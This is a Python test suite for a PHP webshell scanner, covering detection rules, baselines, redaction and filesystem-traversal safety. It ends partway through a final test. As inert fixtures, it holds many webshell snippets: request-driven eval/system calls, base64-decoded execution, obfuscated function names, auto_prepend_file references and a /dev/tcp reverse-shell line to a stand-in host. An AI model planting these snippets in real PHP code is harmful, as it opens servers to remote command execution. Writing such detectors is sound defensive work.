"""Inert strings only: the scanner never invokes PHP or a sample's contents."""
import argparse
import contextlib
import io
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import time
import unittest
from unittest.mock import patch

import p2s_harden as p


class WebshellIndicators(unittest.TestCase):
    def indicators(self, text):
        hits, partial = p.webshell_indicators(text.encode())
        self.assertIsNone(partial)
        return hits

    def test_direct_request_execution_and_literal_safe_command(self):
        for sink in ("system", "exec", "shell_exec", "passthru", "popen", "proc_open", "eval", "assert"):
            with self.subTest(sink=sink):
                self.assertEqual(self.indicators("<?php\n" + sink + "($_POST['private-key']);"), {"request-execution": 2})
                self.assertEqual(self.indicators("<?php " + sink + "('constant');"), {})

    def test_aliases_survive_conditional_blocks_and_reassignment_removes_taint(self):
        self.assertIn("request-execution", self.indicators("<?php $cmd=$_GET['a']; $cmd=trim($cmd); if($ok){system($cmd);}"))
        self.assertIn("request-execution", self.indicators('<?php $cmd=$_GET["a"]; system("$cmd");'))
        self.assertEqual(self.indicators("<?php $cmd=$_GET['a']; $cmd='date'; system($cmd);"), {})
        self.assertEqual(self.indicators("<?php $cmd=$_GET['a']; function f(){system($cmd);}"), {})

    def test_decoders_are_combined_with_code_execution(self):
        for decoder in p._WS_DECODERS:
            self.assertIn("encoded-execution", self.indicators("<?php eval(" + decoder + "('opaque'));"))
            self.assertEqual(self.indicators("<?php $value=" + decoder + "('opaque'); echo $value;"), {})
        self.assertIn('encoded-execution', self.indicators("<?php $decoder='base64_decode'; $code=$decoder('opaque'); eval($code);"))
        self.assertEqual(self.indicators("<?php $code=base64_decode('opaque'); $code='constant'; eval($code);"), {})

    def test_request_body_include_dynamic_callable_and_interpolation(self):
        for code in ("include $_GET['path'];", "require_once($_COOKIE['path']);"):
            self.assertIn("request-include", self.indicators("<?php " + code))
        for code in ("$fn=$_POST['name']; $fn();", "$_GET['name']($_POST['arg']);"):
            self.assertIn("request-callable", self.indicators("<?php " + code))
        for code in ("eval(file_get_contents('php://input'));", "system(filter_input(INPUT_POST,'arg'));", "`echo {$_GET['a']}`;"):
            self.assertIn("request-execution", self.indicators("<?php " + code))
        self.assertIn("request-execution", self.indicators(r'<?php $fn="sys\x74em"; $fn($_GET["x"]);'))
        self.assertIn("request-execution", self.indicators("<?php $fn='sys'.'tem'; $fn($_GET['x']);"))
        self.assertIn('request-callable', self.indicators("<?php call_user_func($_POST['f'], $_POST['x']);"))
        self.assertEqual(self.indicators("<?php array_map('htmlspecialchars', $_POST['x']);"), {})

    def test_network_and_shell_combination_requires_both_indicators(self):
        self.assertIn('network-shell', self.indicators("<?php $s=fsockopen('private.test',1234); proc_open('/bin/sh -i', $fds, $pipes);"))
        self.assertIn('network-shell', self.indicators("<?php exec('/bin/bash -c /dev/tcp/private.test/1234');"))
        for text in ("<?php fsockopen('example.test',443);", "<?php proc_open('/bin/sh -c date', $fds, $pipes);", "<?php fsockopen('example.test',443); exec('sendmail');"):
            self.assertEqual(self.indicators(text), {})

    def test_comments_strings_methods_and_non_php_content_are_inert(self):
        for text in (
            "plain system($_POST['a']);",
            "<?php /* eval(base64_decode($_POST['a'])); */ echo 'ok';",
            "<?php // system($_GET['a']);\n echo 'ok';",
            "<?php # eval($_POST['a']);\n echo 'ok';",
            "<?php $example='eval(base64_decode($_POST[a]));';",
            '<?php $example="eval(base64_decode($_POST[a]));";',
            "<?php $object->system($_GET['a']); ClassName::eval($_GET['b']);",
            "<?php $cmd='file_get_contents'.'php://input'; system($cmd);",
            "<?php $example=<<<'SAMPLE'\neval($_POST['a']);\nSAMPLE;\necho $example;",
            "<?php $example=<<<SAMPLE\neval($_POST['a']);\nSAMPLE;\necho $example;",
        ):
            with self.subTest(text=text):
                self.assertEqual(self.indicators(text), {})

    def test_php_blocks_short_echo_comments_closing_tag_and_non_utf8(self):
        for text in ("html <?=system($_GET['x'])?> footer", "<? system($_GET['x']); ?>", "<?php // comment ?> html <?php eval($_GET['x']);"):
            self.assertIn("request-execution", self.indicators(text))
        self.assertIn("request-execution", p.webshell_indicators(b"\xff\x00<?php eval($_POST['x']);")[0])
        self.assertEqual(self.indicators("<?xml version='1.0'?> system($_GET['x'])"), {})

    def test_duplicate_indicators_keep_first_line_without_source_excerpts(self):
        self.assertEqual(self.indicators("<?php\neval($_GET['secret']);\neval($_POST['secret']);"), {"request-execution": 2})

    def test_token_expression_and_time_limits_are_explicit(self):
        self.assertEqual(p.webshell_indicators(b"<?php eval($_GET['x']);", time.monotonic() - 1)[1], "time")
        self.assertEqual(p.webshell_indicators(b"<?php " + b"+ " * 100001, time.monotonic() + 30)[1], "tokens")
        self.assertEqual(p.webshell_indicators(b"<?php eval(" + b"(" * 130 + b"0" + b")" * 130 + b");")[1], "expression")
        self.assertEqual(p.webshell_indicators(b"<?php eval(" + b"0+" * 300 + b"0);")[1], "expression")
        self.assertEqual(p.webshell_indicators(b"<?php ordinary_helper(" + b"0+" * 300 + b"0);")[1], None)
        large = b"<?php $map=array(" + b"0," * 300 + b"0); "
        self.assertEqual(p.webshell_indicators(large + b"echo $map;")[1], None)
        self.assertEqual(p.webshell_indicators(large + b"array_map('htmlspecialchars', $map);")[1], None)
        self.assertEqual(p.webshell_indicators(large + b"call_user_func($map);")[1], 'expression')
        self.assertEqual(p.webshell_indicators(large + b"$copy=$map; eval($copy);")[1], 'expression')
        self.assertEqual(p.webshell_indicators(large + b"$map='constant'; eval($map);")[1], None)

    def test_comment_heavy_file_is_linear_and_reaches_the_final_indicator(self):
        source = b'<?php\n' + b'//x\n' * 450000 + b"eval($_POST['x']);"
        started = time.monotonic()
        hits, partial = p.webshell_indicators(source, started + 2)
        self.assertIsNone(partial)
        self.assertEqual(hits, {'request-execution': 450002})
        self.assertLess(time.monotonic()-started, 2)

    def test_prefixed_indirect_include_is_review_but_direct_input_stays_high_priority(self):
        self.assertIn('prefixed-include', self.indicators("<?php $page=lookup_page($_GET['page']); include WP_PLUGIN_DIR . '/' . $page;"))
        self.assertIn('prefixed-include', self.indicators("<?php $page=lookup_page($_GET['page']); include '/plugins/' . $page;"))
        self.assertIn('request-include', self.indicators("<?php include '/plugins/' . $_GET['page'];"))
        self.assertIn('request-include', self.indicators("<?php $page=$_GET['page']; include $page;"))

    def test_include_priority_survives_copies_casts_known_transforms_and_scope(self):
        for setup in ("$p=$_GET['p'];", "$a=$_GET['p']; $b=$a; $p=$b;",
                      "$p=(string) $_GET['p'];", "$a=$_GET['p']; $p=(string) $a;",
                      "$p=(string) ($_GET['p']);", "$p=(($_GET['p']));",
                      "$a=$_GET['p']; $p=((string)($a));",
                      "$p=basename($_GET['p']);", "$a=$_GET['p']; $p=basename($a);",
                      "$a=$_GET['p']; $p=trim($a);", "$a=$_GET['p']; $p=\"$a\";",
                      "$p=lookup($_GET['p']) . $_GET['suffix'];",
                      "$p=$_GET['p']; function unrelated(){$p='x';}"):
            with self.subTest(setup=setup):
                hits=self.indicators("<?php " + setup + " include __DIR__ . '/' . $p;")
                self.assertIn('request-include',hits)
                self.assertNotIn('prefixed-include',hits)
        for setup in ("$p=lookup($_GET['p']);", "$a=lookup($_GET['p']); $p=$a;",
                      "$a=$_GET['p']; $p=lookup($a);", "$a=$_GET['p']; $p=lookup(basename($a));"):
            self.assertIn('prefixed-include',self.indicators("<?php " + setup + " include __DIR__ . '/' . $p;"))
        self.assertEqual(self.indicators("<?php $p=$_GET['p']; $p='constant'; include __DIR__ . '/' . $p;"),{})
        self.assertIn('request-execution',self.indicators("<?php $p=lookup($_GET['p']); system($p);"))

    def test_registry_lookup_is_review_but_request_supplied_registry_and_fallback_stay_high(self):
        for sample in ("call_user_func($registry[$_GET['key']][2]);", "$key=$_GET['key']; $registry[$key]();",
                       "$key=$_POST['key']; $form=$registry[$key]; call_user_func_array($form['callback'],$form['params']);",
                       "$key=$_POST['key']; $form=$registry[$key]; $callback=$form['callback']; call_user_func($callback);",
                       "$key=$_POST['key']; $callback=$registry[$key]; $callback();"):
            self.assertIn('registry-callable', self.indicators('<?php '+sample))
        for sample in ("$registry=$_POST; call_user_func($registry['f']);", "call_user_func($registry[$key] ?? $_POST['f']);",
                       "$key=$_POST['key']; $form=$registry[$key]; $form=$_POST['form']; call_user_func($form['callback']);"):
            self.assertIn('request-callable', self.indicators('<?php '+sample))

    def test_startup_parser_obeys_apache_and_ini_comment_rules_without_printing_values(self):
        for sample in (b'php_value auto_prepend_file ;payload.php', b'php_value auto_prepend_file ";payload.php"', b'php_value auto_prepend_file \\none'):
            self.assertEqual(p.webshell_startup_lines(sample, '.htaccess', time.monotonic()+2), ({'startup-reference':1}, None))
        self.assertEqual(p.webshell_startup_lines(b'auto_prepend_file=;comment', '.user.ini', time.monotonic()+2), ({}, None))
        self.assertEqual(p.webshell_startup_lines(b'auto_prepend_file="a;name.php";comment', '.user.ini', time.monotonic()+2), ({'startup-reference':1}, None))
        self.assertEqual(p.webshell_startup_lines(b'php_value auto_prepend_file "unclosed', '.htaccess', time.monotonic()+2)[1], 'config-syntax')
        self.assertEqual(p.webshell_startup_lines(b'php_value auto_prepend_file value # invalid-inline-comment', '.htaccess', time.monotonic()+2)[1], 'config-syntax')
        self.assertEqual(p.webshell_startup_lines(b'# continued comment \\\nphp_value auto_prepend_file hidden.php', '.htaccess', time.monotonic()+2), ({}, None))
        self.assertEqual(p.webshell_startup_lines(b'php_value auto_prepend_file \\\n";payload.php"', '.htaccess', time.monotonic()+2), ({'startup-reference':1}, None))


class WebshellBaselineContracts(unittest.TestCase):
    def entry(self, **changes):
        result = dict(path='/srv/site/index.php', sha256='a'*64, indicators=['request-execution'])
        result.update(changes)
        return result

    def test_manual_and_own_report_baselines_bind_path_hash_and_indicator(self):
        expected = {('/srv/site/index.php','request-execution'):'a'*64}
        self.assertEqual(p.webshell_baseline_entries(dict(schema_version=1,files=[self.entry()])),expected)
        report = dict(schema_version=2,redacted=False,discovery=dict(webshell_scan=True),findings=[
            dict(rule_id='P2S-WS001',resource=dict(path='/srv/site/index.php',indicator='request-execution'),sha256='a'*64),
            dict(rule_id='P2S-WS003',status='UNKNOWN')])
        self.assertEqual(p.webshell_baseline_entries(report),expected)
        report['redacted']=True
        with self.assertRaises(p.CheckError):
            p.webshell_baseline_entries(report)

    def test_malformed_ambiguous_and_noncanonical_baselines_are_rejected(self):
        for entry in (self.entry(path='relative.php'), self.entry(path='/srv/../file.php'), self.entry(path='/srv//file.php'),
                      self.entry(sha256='z'*64), self.entry(indicators=['private value']), self.entry(indicators=[])):
            with self.subTest(entry=entry), self.assertRaises(p.CheckError):
                p.webshell_baseline_entries(dict(schema_version=1,files=[entry]))
        with self.assertRaisesRegex(p.CheckError,'Conflicting'):
            p.webshell_baseline_entries(dict(schema_version=1,files=[self.entry(),self.entry(sha256='b'*64)]))
        with self.assertRaises(p.CheckError):
            p.webshell_baseline_entries(dict(schema_version=1,files=[self.entry()]*10001))


class WebshellReviewPolicy(unittest.TestCase):
    def report(self):
        report=p.Report()
        row=report.add('INFO','PHP code review','Review locally',rule_id='P2S-WS004',resource='fixture',
                       evidence=dict(indicators=['prefixed-include'],review_required=True))
        return report,row

    def test_review_policy_blocks_only_unaccepted_code_review_and_open(self):
        report,row=self.report()
        for policy,expected in (('complete',0),('open',0),('review',1)):
            report.configure(policy)
            self.assertEqual(report.exit_code(),expected)
        report.add('UNKNOWN','Coverage','Incomplete',rule_id='P2S-WS003')
        for policy,expected in (('complete',2),('open',2),('review',1)):
            report.configure(policy)
            self.assertEqual(report.exit_code(),expected)
        for ignore in ([row['id']],['P2S-WS004']):
            report.configure('review',ignore)
            self.assertEqual(report.exit_code(),2)
            self.assertTrue(row['suppressed'])
        row['baseline_accepted']=True
        report.configure('review')
        self.assertEqual(report.exit_code(),2)
        report.rows.pop()
        self.assertEqual(report.exit_code(),0)
        report.add('INFO','Ordinary context','Context')
        self.assertEqual(report.exit_code(),0)
        report.add('OPEN','Finding','Review')
        self.assertEqual(report.exit_code(),1)

    def test_json_and_redacted_policy_counts_retain_review_contract(self):
        report,row=self.report()
        report.configure('review',['P2S-WS004'])
        for redact in (False,True):
            output=io.StringIO()
            with contextlib.redirect_stdout(output):report.show(True,redact=redact)
            data=json.loads(output.getvalue())
            self.assertFalse(data['has_review'])
            self.assertEqual(data['suppressed_review'],1)
            self.assertEqual(data['suppressed_open'],0)
            self.assertEqual(data['exit_code'],0)
            self.assertTrue(data['findings'][0]['evidence']['review_required'])

    def test_scheduling_evidence_stays_readable_and_private_in_both_languages(self):
        report=p.Report()
        report.add('INFO','Scan scheduling','CPU: lowered; I/O: idle; missing or denied priority helpers do not stop the scan; --no-nice opts out',
                   rule_id='P2S-WS006',evidence=dict(cpu_priority='lowered',io_priority='idle',private='SECRET'))
        for lang in ('en','de'):
            output=io.StringIO()
            with contextlib.redirect_stdout(output):report.show(False,lang=lang,redact=True)
            self.assertIn('CPU-Priorität: abgesenkt' if lang=='de' else 'CPU priority: lowered',output.getvalue())
            self.assertNotIn('SECRET',output.getvalue())
        self.assertIn('Scan-Priorität',p.localize('Scan scheduling','de'))
        self.assertIn('fehlende oder gesperrte',p.localize(report.rows[0]['detail'],'de'))


@unittest.skipUnless(sys.platform=='linux','Linux scheduling')
class WebshellScheduling(unittest.TestCase):
    def test_optional_helpers_missing_denied_and_opt_out_do_not_abort(self):
        with patch.object(p.os,'getpriority',return_value=0),patch.object(p.os,'setpriority') as cpu,patch.object(p.shutil,'which',return_value=None):
            self.assertEqual(p.webshell_priority(),dict(cpu_priority='lowered',io_priority='unavailable'))
            cpu.assert_called_once_with(p.os.PRIO_PROCESS,0,10)
        with patch.object(p.os,'getpriority',side_effect=PermissionError),patch.object(p.shutil,'which',return_value='/bin/ionice'),patch.object(p,'trusted',side_effect=p.CheckError('untrusted')):
            self.assertEqual(p.webshell_priority(),dict(cpu_priority='unavailable',io_priority='unavailable'))
        with patch.object(p.os,'getpriority') as cpu,patch.object(p.shutil,'which') as io_helper:
            self.assertEqual(p.webshell_priority(True),dict(cpu_priority='disabled',io_priority='disabled'))
            cpu.assert_not_called()
            io_helper.assert_not_called()
        with patch.object(p.os,'getpriority',return_value=19),patch.object(p.os,'setpriority') as cpu,patch.object(p.shutil,'which',return_value=None):
            self.assertEqual(p.webshell_priority()['cpu_priority'],'already_low')
            cpu.assert_not_called()

    def test_real_cpu_priority_is_lowered_only_in_engine_and_inherited_by_children(self):
        before=os.getpriority(os.PRIO_PROCESS,0)
        code="import json,os,subprocess,sys; import p2s_harden as p; result=p.webshell_priority(); result['nice']=os.getpriority(os.PRIO_PROCESS,0); result['child_nice']=int(subprocess.check_output([sys.executable,'-c','import os;print(os.getpriority(os.PRIO_PROCESS,0))'])); print(json.dumps(result))"
        run=subprocess.run([sys.executable,'-B','-c',code],capture_output=True,text=True,check=True)
        data=json.loads(run.stdout)
        self.assertEqual(data['nice'],max(10,before))
        self.assertEqual(data['child_nice'],data['nice'])
        self.assertEqual(os.getpriority(os.PRIO_PROCESS,0),before)
        if p.shutil.which('ionice'):
            self.assertEqual(data['io_priority'],'idle')


@unittest.skipUnless(sys.platform == "linux", "Linux no-follow descriptor traversal")
class WebshellFilesystem(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(prefix="p2s-webshell-")
        self.root = Path(self.tmp.name)
        self.args = argparse.Namespace(roots=[str(self.root)], discovery={}, progress=False, no_progress=True,
            max_paths=250000, walk_seconds=10, scan_file_bytes=2097152, scan_total_bytes=134217728)

    def tearDown(self):
        self.tmp.cleanup()

    def scan(self):
        return p.scan_webshells(self.args)

    def test_hidden_upload_vendor_and_unusual_extension_are_scanned_without_mutation(self):
        for name in ("uploads/avatar.jpg", "vendor/.hidden/payload", "cache/a.phtml"):
            file = self.root / name
            file.parent.mkdir(parents=True, exist_ok=True)
            file.write_bytes(b"<?php\nsystem($_POST['DO_NOT_LEAK']);")
        before = {str(f): (f.read_bytes(), f.stat().st_mtime_ns, f.stat().st_mode) for f in self.root.rglob('*') if f.is_file()}
        with patch.object(p, "command", side_effect=AssertionError("No external program is needed")):
            report = self.scan()
        self.assertEqual(report.exit_code(), 1)
        self.assertEqual(len([row for row in report.rows if row['status'] == 'OPEN']), 3)
        self.assertEqual(before, {name: (Path(name).read_bytes(), Path(name).stat().st_mtime_ns, Path(name).stat().st_mode) for name in before})
        for row in report.rows[:-1]:
            self.assertRegex(row['sha256'], r'^[a-f0-9]{64}$')
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            report.show(True)
        self.assertNotIn("DO_NOT_LEAK", out.getvalue())

    def test_empty_and_benign_scans_are_info_without_clean_certification(self):
        for sample in (None, b"<?php echo htmlspecialchars($_GET['text']);"):
            if sample:
                (self.root / 'index.php').write_bytes(sample)
            report = self.scan()
            self.assertEqual(report.exit_code(), 0)
            self.assertEqual([row['status'] for row in report.rows], ['INFO'])
            self.assertIn("does not establish a clean server", report.rows[0]['detail'])

    def test_startup_references_do_not_disclose_targets_and_empty_values_are_inert(self):
        (self.root / '.user.ini').write_text("; auto_prepend_file=ignore\nauto_prepend_file=/PRIVATE/TARGET\n")
        (self.root / '.htaccess').write_text('php_value auto_append_file "/PRIVATE/TARGET"\n')
        (self.root / 'php.ini').write_text('auto_prepend_file=""\nauto_append_file=none\n')
        report = self.scan()
        findings = [r for r in report.rows if r['status'] == 'OPEN']
        self.assertEqual(len(findings), 2)
        self.assertEqual({r['rule_id'] for r in findings}, {'P2S-WS002'})
        self.assertNotIn('/PRIVATE/TARGET', json.dumps(report.rows))

    def test_skipped_symlinks_devices_and_missing_paths_are_unknown(self):
        (self.root / 'link').symlink_to('/etc/passwd')
        os.mkfifo(str(self.root / 'pipe'))
        report = self.scan()
        self.assertEqual(report.exit_code(), 2)
        self.assertEqual(set(report.rows[-1]['evidence']['coverage_reasons']), {'symlink', 'special'})
        self.args.roots = [str(self.root / 'absent')]
        self.assertEqual(self.scan().exit_code(), 2)
        self.args.roots = [str(self.root / 'link')]
        self.assertEqual(self.scan().exit_code(), 2)

    def test_directory_ancestor_symlink_is_not_followed(self):
        real = self.root / 'real'
        real.mkdir()
        (real / 'sub').mkdir()
        (self.root / 'alias').symlink_to(real, target_is_directory=True)
        self.args.roots = [str(self.root / 'alias/sub')]
        report = self.scan()
        self.assertEqual(report.exit_code(), 2)
        self.assertEqual(report.rows[-1]['evidence']['examined_files'], 0)

    def test_replacement_with_symlink_cannot_read_an_out_of_scope_target(self):
        file = self.root / 'race.php'
        file.write_text('benign')
        original = p.os.open
        replaced = []
        def open_file(path, flags, *args, **kwargs):
            if path == 'race.php' and not replaced:
                replaced.append(True)
                file.unlink()
                file.symlink_to('/etc/passwd')
            return original(path, flags, *args, **kwargs)
        with patch.object(p.os, 'open', side_effect=open_file):
            report = self.scan()
        self.assertEqual(report.exit_code(), 2)
        self.assertEqual(report.rows[-1]['evidence']['examined_files'], 0)

    def test_permission_failure_continues_to_independent_files(self):
        (self.root / 'denied.php').write_text('benign')
        (self.root / 'found.php').write_text("<?php eval($_GET['x']);")
        original = p.os.open
        def open_file(path, flags, *args, **kwargs):
            if path == 'denied.php':
                raise PermissionError('PRIVATE_DIAGNOSTIC')
            return original(path, flags, *args, **kwargs)
        with patch.object(p.os, 'open', side_effect=open_file):
            report = self.scan()
        self.assertTrue(report.has('OPEN'))
        self.assertTrue(report.has('UNKNOWN'))
        self.assertNotIn('PRIVATE_DIAGNOSTIC', json.dumps(report.rows))

    def test_depth_and_finding_limits_are_explicit(self):
        directory = self.root
        for _ in range(65):
            directory = directory / 'd'
            directory.mkdir()
        self.assertIn('depth', self.scan().rows[-1]['evidence']['coverage_reasons'])
        for number in range(201):
            (self.root / ('payload-' + str(number))).write_text("<?php eval($_POST['x']);")
        report = self.scan()
        self.assertEqual(len([row for row in report.rows if row['status'] == 'OPEN']), 200)
        self.assertIn('findings', report.rows[-1]['evidence']['coverage_reasons'])
        output = io.StringIO()
        with contextlib.redirect_stdout(output):
            report.show()
        self.assertLess(output.getvalue().index('Webshell scan coverage'), output.getvalue().index('PHP file indicator'))
        self.assertNotIn('Discovered: 0 host FPM', output.getvalue())

    def test_limits_remain_unknown_and_findings_survive_incomplete_coverage(self):
        (self.root / 'small.php').write_text("<?php eval($_GET['x']);")
        (self.root / 'large.bin').write_bytes(b'<?php ' + b'x' * 2048)
        self.args.scan_file_bytes = 1024
        report = self.scan()
        self.assertEqual(report.exit_code(), 2)
        self.assertTrue(report.has('OPEN'))
        self.assertIn('file-size', report.rows[-1]['evidence']['coverage_reasons'])
        report.configure('open')
        self.assertEqual(report.exit_code(), 1)
        self.args.scan_total_bytes = 10
        self.assertIn('total-bytes', self.scan().rows[-1]['evidence']['coverage_reasons'])
        self.args.max_paths = 1
        self.args.scan_total_bytes = 134217728
        self.assertIn('entries', self.scan().rows[-1]['evidence']['coverage_reasons'])

    def test_changed_file_is_not_reported_as_fully_examined(self):
        file = self.root / 'race.php'
        file.write_text("<?php eval($_GET['x']);")
        original = p.os.read
        changed = []
        def read(fd, count):
            result = original(fd, count)
            if result and not changed:
                changed.append(True)
                file.write_text("changed during read")
            return result
        with patch.object(p.os, 'read', side_effect=read):
            report = self.scan()
        self.assertEqual(report.exit_code(), 2)
        self.assertIn('changed', report.rows[-1]['evidence']['coverage_reasons'])

    def test_large_files_without_php_are_streamed_and_binary_short_tags_are_inert(self):
        self.args.scan_file_bytes=1024
        (self.root/'large.js').write_bytes(b'// harmless asset\n'*20000)
        (self.root/'image.jpg').write_bytes(b'\x00\xff<?' + b'(' * 150 + b'eval($_GET["x"]);')
        (self.root/'unicode.txt').write_text('Grüße, 世界\n'*500,encoding='utf-8')
        report=self.scan()
        self.assertEqual(report.exit_code(),0)
        self.assertEqual(report.rows[-1]['evidence']['examined_files'],3)
        self.args.scan_total_bytes=1024
        self.assertIn('total-bytes',self.scan().rows[-1]['evidence']['coverage_reasons'])

    def test_explicit_php_in_binary_assets_and_text_short_tags_remain_detectable(self):
        samples=(b'\x00\xff<?php eval($_GET["x"]);', b'\x00<?=system($_GET["x"]);',
                 b'<? system($_GET["x"]);', 'Grüße <? system($_GET["x"]);'.encode())
        for index,sample in enumerate(samples):
            (self.root/('asset-'+str(index)+'.jpg')).write_bytes(sample)
        report=self.scan()
        self.assertEqual(sum(r['status']=='OPEN' for r in report.rows),len(samples))
        for row in report.rows[:-1]:
            self.assertEqual(row['sha256'],p.digest(Path(row['resource']['path']).read_bytes()))

    def test_opener_search_covers_chunk_boundaries_tail_and_post_limit_php(self):
        for offset in (65530,65533,65534,65535,65536,131071):
            file=self.root/'large.data'
            file.write_bytes(b'\x00'+b'x'*(offset-1)+b'<?php eval($_GET["x"]);')
            self.args.scan_file_bytes=1024
            self.assertIn('file-size',self.scan().rows[-1]['evidence']['coverage_reasons'])
            self.args.scan_file_bytes=262144
            self.assertTrue(self.scan().has('OPEN'))
        file.write_bytes(b'x'*65535+b'<?')
        self.args.scan_file_bytes=1024
        self.assertIn('file-size',self.scan().rows[-1]['evidence']['coverage_reasons'])
        file.write_bytes(b'x'*65535+b'<?xml version="1.0"?>')
        self.assertEqual(self.scan().exit_code(),0)
        file.write_bytes(b'\x00'+b'x'*65530+b'<?phpSuffix')
        self.assertEqual(self.scan().exit_code(),0)

    def test_opener_search_remains_correct_with_arbitrarily_short_reads(self):
        (self.root/'polyglot.bin').write_bytes(b'\x00<?php eval($_GET["x"]);')
        read=p.os.read
        with patch.object(p.os,'read',side_effect=lambda fd,count: read(fd,min(count,1))):
            self.assertTrue(self.scan().has('OPEN'))

    def test_large_startup_config_without_php_tag_still_requires_parsing(self):
        (self.root/'.user.ini').write_bytes(b'; benign\n'*1024+b'auto_prepend_file=payload.php\n')
        self.args.scan_file_bytes=1024
        self.assertIn('file-size',self.scan().rows[-1]['evidence']['coverage_reasons'])

    def test_redaction_has_useful_facts_but_no_path_source_hash_or_original_id(self):
        file = self.root / 'PRIVATE_HOST.php'
        file.write_text("<?php\neval(base64_decode($_POST['PRIVATE_SECRET']));")
        report = self.scan()
        for as_json in (True, False):
            output = io.StringIO()
            with contextlib.redirect_stdout(output):
                report.show(as_json, lang='de', redact=True)
            text = output.getvalue()
            for private in ('PRIVATE_HOST', 'PRIVATE_SECRET', str(self.root), report.rows[0]['id'], report.rows[0]['sha256']):
                self.assertNotIn(private, text)
            self.assertIn('encoded-execution' if as_json else 'Decoder-Ausgabe', text)
        self.assertEqual(p.safe_evidence('P2S-WS001', dict(indicators=['PRIVATE_SECRET'], line='secret', sha256='secret')), {})

    def test_real_cli_without_fpm_runs_read_only_and_json_contract_is_preserved(self):
        (self.root / 'index.php').write_text("<?php system($_GET['x']);")
        result = subprocess.run([sys.executable, '-B', str(Path(p.__file__)), '--scan-webshells', '--root', str(self.root), '--json'], capture_output=True, text=True)
        self.assertEqual(result.returncode, 1, result.stderr)
        data = json.loads(result.stdout)
        self.assertTrue(data['has_open'])
        self.assertFalse(data['has_unknown'])
        self.assertIsNone(data['plan'])
        self.assertIsNone(data['transaction'])
        self.assertEqual(set(r['rule_id'] for r in data['findings']), {'P2S-WS001', 'P2S-WS003', 'P2S-WS006'})

    def test_bash_ssh_transport_runs_the_mode_with_quoted_root_and_exact_exit(self):
        root = self.root / "a space and 'quote"
        root.mkdir()
        (root / 'index.php').write_text("<?php eval($_POST['x']);")
        ssh = self.root / 'fake-ssh'
        ssh.write_text('#!/bin/bash\nfor argument; do last="$argument"; done\nexec /bin/sh -c "$last"\n')
        ssh.chmod(0o700)
        result = subprocess.run(['/bin/bash', str(Path(p.__file__).with_name('p2s-harden.sh')), '--ssh', 'inert.test',
            '--scan-webshells', '--root', str(root), '--scan-file-bytes', '4096', '--scan-total-bytes', '8192', '--no-nice', '--fail-on', 'review', '--redact', '--json'],
            env=dict(os.environ, SSH_BIN=str(ssh)), capture_output=True, text=True)
        self.assertEqual(result.returncode, 1, result.stderr)
        data = json.loads(result.stdout)
        self.assertTrue(data['redacted'])
        self.assertTrue(data['has_open'])
        self.assertFalse(data['has_unknown'])
        self.assertNotIn(str(root), result.stdout)

    def test_file_timeout_continues_and_partial_files_are_not_fully_examined(self):
        slow = self.root / 'slow.php'
        slow.write_bytes(b'<?php costly')
        (self.root / 'found.php').write_text("<?php eval($_POST['x']);")
        self.args.walk_seconds = 0
        original = p.webshell_indicators
        def inspect(data, deadline, **options):
            return ({}, 'time') if data == b'<?php costly' else original(data,deadline,**options)
        with patch.object(p,'webshell_indicators',side_effect=inspect):
            report=self.scan()
        self.assertTrue(report.has('OPEN'))
        self.assertTrue(report.has('UNKNOWN'))
        facts=report.rows[-1]['evidence']
        self.assertEqual(facts['attempted_files'],2)
        self.assertEqual(facts['examined_files'],1)
        self.assertEqual(facts['incomplete_files'],1)
        self.assertEqual(facts['coverage_counts'],{'file-time':1})
        self.assertEqual(report.discovery['webshell_coverage'][0]['paths'],[dict(path=str(slow),reason='file-time')])

    def test_comment_stress_file_does_not_hide_later_shells(self):
        (self.root/'comment-heavy.php').write_bytes(b'<?php\n'+b'//x\n'*450000)
        for number in range(300):
            (self.root/('shell-'+str(number)+'.php')).write_text("<?php eval($_POST['x']);")
        self.args.walk_seconds=120
        report=self.scan()
        self.assertEqual(len([r for r in report.rows if r['status']=='OPEN']),200)
        self.assertIn('findings',report.rows[-1]['evidence']['coverage_reasons'])
        self.assertNotIn('time',report.rows[-1]['evidence']['coverage_reasons'])

    def test_coverage_paths_are_actionable_locally_and_only_counts_survive_redaction(self):
        file=self.root/'PRIVATE_OVERSIZED.bin'
        file.write_bytes(b'<?php '+b'x'*2048)
        self.args.scan_file_bytes=1024
        report=self.scan()
        self.assertEqual(report.rows[-1]['evidence']['examined_files'],0)
        for as_json in (False,True):
            output=io.StringIO()
            with contextlib.redirect_stdout(output): report.show(as_json)
            self.assertIn(str(file),output.getvalue())
            self.assertIn('file-size',output.getvalue())
            output=io.StringIO()
            with contextlib.redirect_stdout(output): report.show(as_json,redact=True)
            self.assertNotIn('PRIVATE_OVERSIZED',output.getvalue())
            self.assertNotIn(str(self.root),output.getvalue())
            if as_json:
                data=json.loads(output.getvalue())
                self.assertEqual(data['findings'][-1]['evidence']['coverage_counts'],{'file-size':1})
        self.assertEqual(p.safe_evidence('P2S-WS003',dict(coverage_counts={'PRIVATE_REASON':1})),{})

    def test_coverage_path_truncation_is_explicit_and_counters_remain_complete(self):
        for number in range(1002):
            (self.root/str(number)).symlink_to('/absent')
        report=self.scan()
        coverage=report.discovery['webshell_coverage'][0]
        self.assertEqual(len(coverage['paths']),1000)
        self.assertEqual(coverage['issue_count'],1002)
        self.assertEqual(coverage['omitted_paths'],2)
        self.assertEqual(report.rows[-1]['evidence']['coverage_counts'],{'symlink':1002})

    def test_review_indicators_are_visible_without_high_open_exit(self):
        (self.root/'plugin.php').write_text("<?php $plugin=lookup_plugin($_GET['p']); include WP_PLUGIN_DIR . '/' . $plugin; call_user_func($registry[$plugin][2]);")
        report=self.scan()
        self.assertEqual(report.exit_code(),0)
        reviews=[r for r in report.rows if r['rule_id']=='P2S-WS004']
        self.assertEqual(len(reviews),2)
        self.assertTrue(all(r['status']=='INFO' and r['evidence']['review_required'] for r in reviews))

    def test_exact_baseline_acceptance_is_visible_and_never_accepts_changes_or_coverage(self):
        file=self.root/'index.php'
        file.write_bytes(b"<?php eval($_POST['x']);")
        self.args.baseline='protected-fixture'
        entries={(str(file),'request-execution'):p.digest(file.read_bytes())}
        with patch.object(p,'read_webshell_baseline',return_value=entries):
            report=self.scan()
            report.configure()
            self.assertEqual(report.exit_code(),0)
            accepted=[r for r in report.rows if r.get('baseline_accepted')]
            self.assertEqual(len(accepted),1)
            self.assertTrue(accepted[0]['suppressed'])
            output=io.StringIO()
            with contextlib.redirect_stdout(output): report.show(True,redact=True)
